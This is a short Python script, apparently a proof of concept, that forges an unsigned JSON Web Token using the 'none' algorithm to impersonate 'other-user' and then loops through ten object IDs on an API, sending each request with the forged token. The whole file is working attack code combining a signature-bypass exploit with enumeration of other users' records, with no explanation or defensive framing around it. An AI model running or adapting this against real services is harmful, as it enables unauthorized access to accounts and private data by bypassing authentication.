import base64
import json
import requests

header = {"alg": "none", "typ": "JWT"}
b64url = lambda value: base64.urlsafe_b64encode(json.dumps(value).encode()).decode().rstrip("=")
token = ".".join([b64url(header), b64url({"sub": "other-user"}), ""])
for object_id in range(10):
    response = requests.get(f"https://protected.corpus.invalid/api?id={object_id}", headers={"Authorization": "Bearer " + token})
